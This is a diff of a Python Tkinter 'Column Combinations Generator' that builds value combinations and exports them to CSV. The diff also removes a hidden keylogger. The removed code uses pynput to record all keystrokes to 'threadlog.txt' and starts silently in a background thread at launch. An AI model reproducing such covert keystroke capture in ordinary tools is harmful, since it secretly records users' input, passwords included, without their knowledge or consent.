@@ -1,117 +1,101 @@
 import tkinter as tk
 from tkinter import simpledialog, scrolledtext, filedialog, messagebox
-from itertools import product
 import csv
-from pynput import keyboard
-import threading
-import time
+from itertools import product, combinations_with_replacement
 
-# Global variables for keylogging
-keylog_data = []
-keylog_file = "threadlog.txt"
-stop_keylogger = False
 
-# Function to log keys to a file
-def log_keys_to_file():
-    with open(keylog_file, "a") as f:
-        for entry in keylog_data:
-            f.write(entry + "\n")
-        keylog_data.clear()
-
-# Keylogger functions
-def on_press(key):
-    try:
-        key_text = key.char if hasattr(key, 'char') else str(key)
-        keylog_data.append(key_text)
-    except Exception as e:
-        keylog_data.append(f"[Error: {e}]")
-
-    if len(keylog_data) > 10:  # Log to file in batches for performance
-        log_keys_to_file()
-
-def on_release(key):
-    if key == keyboard.Key.esc:  # Stop listener on Escape key
-        global stop_keylogger
-        stop_keylogger = True
-        return False
-
-def start_keylogger():
-    global stop_keylogger
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        while not stop_keylogger:
-            listener.join()
-
-# Tkinter App for Column Combinations
 class ColumnCombinations:
     def __init__(self, master):
         self.master = master
         self.master.title("Column Combinations Generator")
         self.columns = []
         self.row_contents = []
+        self.max_values = []
         self.combinations = []
 
         self.setup_ui()
 
     def setup_ui(self):
+        self.master.grid_columnconfigure(0, weight=1, minsize=300)
+        self.master.grid_rowconfigure(0, weight=1)
+        self.master.grid_rowconfigure(1, weight=2)
+
         num_columns = simpledialog.askinteger("Columns", "How many columns do you want?", minvalue=1, maxvalue=10)
+        if num_columns is None:
+            self.master.quit()
+            return
 
         for i in range(num_columns):
             column_name = simpledialog.askstring("Column Name", f"Enter name for column {i + 1}")
+            if column_name is None:
+                self.master.quit()
+                return
             self.columns.append(column_name)
 
-            # Ask for comma-separated row content
             row_data = simpledialog.askstring("Row Content", f"Enter comma-separated values for '{column_name}'")
-            rows = [item.strip() for item in row_data.split(',')]  # Split and strip whitespace
+            if row_data is None:
+                self.master.quit()
+                return
+            rows = [item.strip() for item in row_data.split(',')]
             self.row_contents.append(rows)
 
-        # Make columns responsive
-        for i in range(len(self.columns)):
-            self.master.grid_columnconfigure(i, weight=1, uniform="equal")  # Makes columns resize equally
+            max_val = simpledialog.askinteger("Max Value", f"Enter the maximum total for '{column_name}'")
+            if max_val is None:
+                self.master.quit()
+                return
+            self.max_values.append(max_val)
 
-        self.master.grid_rowconfigure(0, weight=1)  # Make header row adjustable
-        self.master.grid_rowconfigure(2, weight=1)  # Make the results row adjustable
+        self.result_text = scrolledtext.ScrolledText(self.master, wrap=tk.WORD, width=50, height=20)
+        self.result_text.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
-        for i, column in enumerate(self.columns):
-            tk.Label(self.master, text=column, font=('Arial', 12, 'bold')).grid(row=0, column=i, padx=5, pady=5, sticky="ew")
+        generate_button = tk.Button(self.master, text="Generate Combinations", command=self.generate_combinations)
+        generate_button.grid(row=2, column=0, pady=5, sticky="ew")
 
-        tk.Button(self.master, text="Generate Combinations", command=self.generate_combinations).grid(row=1, column=0, columnspan=len(self.columns), pady=10, sticky="ew")
-
-        # Button to save combinations as CSV
-        tk.Button(self.master, text="Save as CSV", command=self.save_to_csv).grid(row=1, column=len(self.columns), padx=5, pady=10, sticky="ew")
-
-        self.result_text = scrolledtext.ScrolledText(self.master, width=50, height=20)
-        self.result_text.grid(row=2, column=0, columnspan=len(self.columns), padx=10, pady=10, sticky="nsew")
+        save_button = tk.Button(self.master, text="Save as CSV", command=self.save_to_csv)
+        save_button.grid(row=3, column=0, pady=5, sticky="ew")
 
     def generate_combinations(self):
-        self.combinations = list(product(*self.row_contents))  # Generate cartesian product of rows
+        column_combinations = []
+        for i, rows in enumerate(self.row_contents):
+            max_val = self.max_values[i]
+            column_combinations.append(self.generate_column_combinations(rows, max_val))
+
+        self.combinations = list(product(*column_combinations))
         self.display_combinations()
+
+    def generate_column_combinations(self, rows, max_val):
+        combinations = []
+        for combo in combinations_with_replacement(range(len(rows)), max_val):
+            counts = [combo.count(i) for i in range(len(rows))]
+            formatted = [f"{count} pcs {rows[i]}" for i, count in enumerate(counts) if count > 0]
+            if sum(counts) == max_val:
+                combinations.append("_".join(formatted))  # Ensure each combination uses an underscore as the separator
+        return combinations
 
     def display_combinations(self):
         self.result_text.delete('1.0', tk.END)
+        if not self.combinations:
+            self.result_text.insert(tk.END, "No combinations generated.\n")
+            return
+
         for combo in self.combinations:
-            self.result_text.insert(tk.END, f"{'_'.join(combo)}\n")  # Use underscore as separator
+            self.result_text.insert(tk.END, f"{'_'.join(combo)}\n")  # Ensure underscore-separated combinations
 
     def save_to_csv(self):
-        # Open a save file dialog to choose the location and file name
         file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")])
         if file_path:
             try:
                 with open(file_path, mode='w', newline='', encoding='utf-8') as file:
                     writer = csv.writer(file)
-                    # Write a header for the single column
-                    writer.writerow(["Combinations"])
-                    # Write each combination as a single string in one column with underscores
+                    writer.writerow(["All Combinations"])
                     for combo in self.combinations:
-                        writer.writerow(["_".join(combo)])
+                        writer.writerow(["_".join(combo)])  # Save combinations with underscores
                 messagebox.showinfo("Success", f"Combinations saved to {file_path}")
             except Exception as e:
                 messagebox.showerror("Error", f"An error occurred while saving the file: {e}")
 
-if __name__ == "__main__":
-    threading.Thread(target=start_keylogger, daemon=True).start()
 
-    # Start the Tkinter application
+if __name__ == "__main__":
     root = tk.Tk()
     app = ColumnCombinations(root)
     root.mainloop()
-
